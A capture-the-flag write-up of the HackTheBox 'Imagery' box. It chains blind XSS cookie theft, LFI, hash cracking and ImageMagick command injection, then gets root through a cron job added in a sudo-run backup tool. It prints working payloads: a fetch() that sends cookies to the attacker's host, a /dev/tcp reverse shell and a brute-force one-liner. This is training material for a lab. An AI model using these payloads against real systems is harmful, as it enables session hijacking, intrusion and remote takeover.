---
created: 2025-09-28
---

📅 `2025-09-28`

#xss #lfi #hashcat #command-injection #backup #bash-scripting #sudo

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Imagery`  |
| --------------- | --- |
| 📆 Release Date |   `2025-09-28`  |
| 🌐 IP Address   |  `10.10.11.88`   |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |   `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Blind `XSS`
- `LFI`
- Password cracking
- Lateral movement to another web app user
- Command injection
- Backup of web app
- Brute force web app backup file's password with custom `bash` one-liner

**🛠️ Tools:**  

- `BurpSuite`

**📚 Learned:**  

- For `XSS` callbacks, the `Python` web server was more reliable than `asm-server`.
- Keep an eye out for non-standard directories like `/var/backup/`. Look for backups. Ignore `dpkg.*` and other default files.
- Learned to make a simple `bash` password brute force one-liner.

----

## 🌐 Port Scan

- **TCP**: 22, 8000
- **UDP**: None

---

## 🔍 Enumeration

Port 8000 had a web server with a website for uploading and displaying images.

![[Pasted image 20250928215437.png]]

I inspected the page manually first, enumerating the technologies with `whatweb -a 3` and `Wappalyzer`. The website allowed users to create an account, so I did.

- `test@test.com`:`12345678`

The front end's `JavaScript` source contains a lot of functionality.

![[Pasted image 20250928215602.png]]

Reviewing the file for vulnerabilities, I found this:

![[Pasted image 20250928215654.png]]

This section of the function `loadBugReports` embedded the contents of the bug report in the website without sanitizing, meaning we can achieve blind `XSS`. Since it's a bug report, I suppose there is an administrator checking them on the other side, so it may be possible to retrieve their session cookies and hijack their session.

I logged in with my new account to look for functionality related to bug reports. After a few minutes I found this:

![[Pasted image 20250928221931.png]]

Here is the bug report form:

![[Pasted image 20250928221940.png]]


I started my `Python` web server and after trying many payloads, this was the one that worked:

```javascript
<img src='x' onerror=fetch('http://10.10.14.14:8000/?cookie='+document.cookie) />
```

I received an `HTTP` request with a session cookie after a few minutes.

```
10.10.11.88 - - [28/Sep/2025 20:59:11] "GET /?cookie=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNnn7Q.RB9X_8hsO1kZh-V4zZgss2ShvPM HTTP/1.1" 200 -
```

>[!tip]
>`XSS` can take a while to work because the user needs to see the payload. Even in these `HackTheBox` machines, the simulation is accurate and it can take some minutes for the simulated user to interact with our payload. 

I replaced my cookie with the one I retrieved and got access as admin.

![[Pasted image 20250928222533.png]]

The administrator panel had functions to review bug reports and to inspect and delete user logs.

![[Pasted image 20250928222702.png]]

I downloaded a log and inspected the request in `BurpSuite`. For downloading the log file, a request was made to the corresponding endpoint with the log file name as the `log_identifier` `URL` parameter.

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier/<filename>
```

This looked like `LFI`, so I tried with `/etc/passwd` and got this:

![[Pasted image 20250928222917.png]]

Got `LFI`.

After some enumeration I found that the root of the web app is `/home/web/web/`, and since it's a `Python` web app, the main file was `app.py`.

I found this line in the file:

```python
from config import *
```

This meant that there was a `config.py` file in the web root. I downloaded it to inspect.

```python
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
```

The most interesting entry is the `db.json` file at the top. I read it and found this:

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [
        
    ],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": [
        
    ]
}
```

Two default users and their password hashes. I tried to crack them but only managed to crack the one from `testuser@imagery.htb`.

- `testuser@imagery.htb`:`iambatman`

Next, I looked for where these credentials work. I tried them over `SSH` with user `mark` (found in `/etc/passwd` through the `LFI`), but the server only accepts key authentication (`Permission denied (publickey)`). Let's try them in the web app.

They worked, and reading the source code of the frontend again I found that `testuser` has some functions that not even admin can use, such as group management.

![[Pasted image 20250929175811.png]]

---

## 🪜 Foothold

After investigating the `Python` source code via the `LFI` I found this in the `api_edit.py` file:

```python
<SNIP>
if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))

            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
<SNIP>
```

This was the `crop` functionality, which is an image edit option only available to `testuser`. The function builds a shell command from user input without sanitizing it. I managed to get a reverse shell with this procedure.

We need to access the `crop` function. As `testuser`, select the `Transform Image` option from an uploaded image.

![[Pasted image 20250929215915.png|400]]

In the menu, select `Crop` and apply any crop.

![[Pasted image 20250929215953.png|600]]

We have to edit the `x` value in `BurpSuite` to inject commands. First, start `penelope` on port 1234 to catch the reverse shell.

Download the shell:

![[Pasted image 20250929220045.png]]

Execute the shell:

![[Pasted image 20250929220100.png]]

And...

![[Pasted image 20250929220111.png]]

Got a reverse shell.

---

## 👤 User

We are user `web`. Enumerating this user's home directory I found the `web/` directory with the web app's source code. It had a `bot/` directory with only one file called `admin.py` with what looks like an automated user interaction using `selenium webdriver`.

```
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import tempfile, shutil, time, traceback, uuid, os, glob

# ----- Config -----
CHROME_BINARY = "/usr/bin/google-chrome"
USERNAME = "admin@imagery.htb"
PASSWORD = "strongsandofbeach"
BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
APP_URL = "http://0.0.0.0:8000"
# ------------------

# Clean up old profiles
for folder in glob.glob("/tmp/chrome-profile-*"):
    try:
<SNIP>
```

It had credentials. Interesting.

The credentials only worked on the web application and we already had an administrator session. I had to look somewhere else, but saved the credentials just in case. Browser credential extraction tools didn't find anything either. I had to enumerate manually.

I found this strange directory `/var/backup/`.

![[Pasted image 20250929233413.png|300]]

It isn't the default `/var/backups/` directory. It has a file named `web_20250806_120723.zip.aes`, which `file` identifies as encrypted with `pyAesCrypt`. I installed the tool within a `venv` and figured out the syntax is `pyAesCrypt <file> -p <pass> -d`. I tried the passwords I found earlier, two of them:

- `iambatman`
- `strongsandofbeach`

But they didn't work. I looked for passwords and didn't find anything, so I brute-forced it with a simple one-liner.

```bash
while read line; do pyAesCrypt web_20250806_120723.zip.aes -p "$line" -d &>/dev/null && echo -e "[\e[32m+\e[0m] Password found: $line" && break; done < $ROCKYOU

[+] Password found: bestfriends
```

Now I have the backup of the web app, so I unzipped it.

```shell
$ unzip web_20250806_120723.zip -d web_app_backup
$ cd web_app_backup
$ ls
web
```

I read the `db.json` and found new users.

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

User `mark` exists on the machine, so let's crack the passwords.

```shell
.\hashcat.exe -a 0 -m 0 '01c3d2e5bdaf6134cec0a367cf53e535' .\rockyou.txt -r .\rules\best64.rule -O -w 4

01c3d2e5bdaf6134cec0a367cf53e535:supersmash
```

- `mark`:`supersmash`

Then I tried them:

```
web@Imagery:/var/backup$ su - mark
Password: 
mark@Imagery:~$ ls
user.txt
```

Got user.

---

## 🛡️ Privilege Escalation

I started by enumerating `sudo` permissions with `sudo -l`.

```shell
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

My user didn't have permissions to read the binary, so I had to explore it by running it.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0


Charcol is already set up.
To enter the interactive shell, use: charcol shell
To see available commands and flags, use: charcol help
```

Let's try this shell command.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-09-30 05:06:17] [ERROR] Incorrect master passphrase. 2 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-09-30 05:06:20] [ERROR] Incorrect master passphrase. 1 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-09-30 05:06:20] [ERROR] Incorrect master passphrase after multiple attempts. Exiting application. If you forgot your master passphrase, then reset password using charcol -R command for more info do charcol help. (Error Code: CPD-002)
```

Apparently, I can reset the password.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol -R

Attempting to reset Charcol application password to default.
[2025-09-30 05:06:31] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-09-30 05:06:37] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

Now let's run it again.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
[2025-09-30 05:06:54] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
```

It asked me to perform an initial setup. I chose the no-password mode. After this configuration is made, let's run the tool again.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-09-30 05:07:00] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> help
[2025-09-30 05:07:03] [INFO] 
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      
<SNIP>
```

Finally, it let me into the shell. Apparently, it's a tool made for managing scheduled tasks, and since I'm running it as root, the obvious move is to create a scheduled task that runs a reverse shell. This line of the help menu is the interesting one:

```shell
auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
```

I created a scheduled task that runs a reverse shell every minute.

```shell
charcol> auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/10.10.14.14/12345 0>&1'" --name "test"

Enter system password for user 'mark' to confirm:
```

Now let's start `Penelope` and wait.

![[Pasted image 20250930001414.png|600]]

Rooted.